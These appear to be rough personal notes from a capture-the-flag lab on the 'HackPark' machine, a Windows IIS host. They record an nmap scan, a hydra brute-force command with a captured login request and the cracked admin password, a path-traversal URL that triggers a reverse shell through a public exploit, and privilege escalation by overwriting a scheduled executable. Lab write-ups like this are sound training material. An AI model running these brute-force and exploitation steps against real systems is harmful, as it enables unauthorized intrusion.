# scan: 
➜ nmap -sC -sV -Pn 10.10.99.216 -o nmap_scan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 19:00 EDT
Nmap scan report for 10.10.99.216
Host is up (0.12s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-04-30T23:01:02+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# hydra
find login page
using post to log in
Use burp to see the whole thing (could also use inspect)
burp contents of request:
POST /Account/login.aspx?ReturnURL=%2fadmin HTTP/1.1
Host: 10.10.99.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.99.216/Account/login.aspx?ReturnURL=/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 548
Connection: close
Upgrade-Insecure-Requests: 1

__VIEWSTATE=QqkSpsUP5gospargWzEgk4%2FEEWd8r2YYfHY6Cc2mFVXBLVIBhNg00hwOefJAMh0jg7XBQQx%2FqxIVJ3RiwmeHG9ecZRPNlkoSyj4N3EYlrYg0EfdqYA1d%2FW0QO4oFoIuEqvVGISPNvOUnFApOS8zd2g%2FikJr7WESaanKyAG9TKut5oLCM&__EVENTVALIDATION=LdcrXoxAy31C4QIAy%2BnyJc0xaZLhzCTaC%2FNw%2Bb2viVEIDeIN3qPm5kt%2F642MuKN1VYJiVSrgtCzej5%2BFMKDFZuZUVePuFXyLF0E1Aa7oW7kZatayXUozYqk2N4QRvoBdm01trApNqsvUIl0WiJDqnUBrvmETd3NUCzaTDtR%2FxPPq%2B4At&ctl00%24MainContent%24LoginUser%24UserName=a&ctl00%24MainContent%24LoginUser%24Password=a&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
hydra command: 
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 10.10.99.216 http-post-form "/Account/login.aspx?ReturnUrl=/admin:__VIEWSTATE=QqkSpsUP5gospargWzEgk4%2FEEWd8r2YYfHY6Cc2mFVXBLVIBhNg00hwOefJAMh0jg7XBQQx%2FqxIVJ3RiwmeHG9ecZRPNlkoSyj4N3EYlrYg0EfdqYA1d%2FW0QO4oFoIuEqvVGISPNvOUnFApOS8zd2g%2FikJr7WESaanKyAG9TKut5oLCM&__EVENTVALIDATION=LdcrXoxAy31C4QIAy%2BnyJc0xaZLhzCTaC%2FNw%2Bb2viVEIDeIN3qPm5kt%2F642MuKN1VYJiVSrgtCzej5%2BFMKDFZuZUVePuFXyLF0E1Aa7oW7kZatayXUozYqk2N4QRvoBdm01trApNqsvUIl0WiJDqnUBrvmETd3NUCzaTDtR%2FxPPq%2B4At&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
the login failed part at the end is how hydra knows if it worked or not, should match what the website responds with 
find admin has 1qaz2wsx

# exploit
use 46353.cs
change values and do what it says and get shell 
go to http://10.10.99.216/?theme=../../App_Data/files to get callback after upload as PostView.ascx

# enumerate
use systeminfo to get info and pluyg into windows-exploit-suggester
Nothing there that I can use really. - maybe this: cat /usr/share/exploitdb/exploits/windows/local/37049.txt
Tried that, didn't work or do anything =/ does it work if I'm on MSF? GOt some weird errors on that too. 
Uploaded and ran winPEAS
* could use psexec probably since winpeas has a password thatmight work? 


#excalate
Has something to do with the scheduler, not sure what exe they're looking for
Can see that it's autorunning and everyone can run it. 
See that systemscheduler has event logs that show message.exe is restarting a lot
overwrite with exe and get shell
Could have used one of the things exploit suggested I would just have to compile them to get different functionality. 
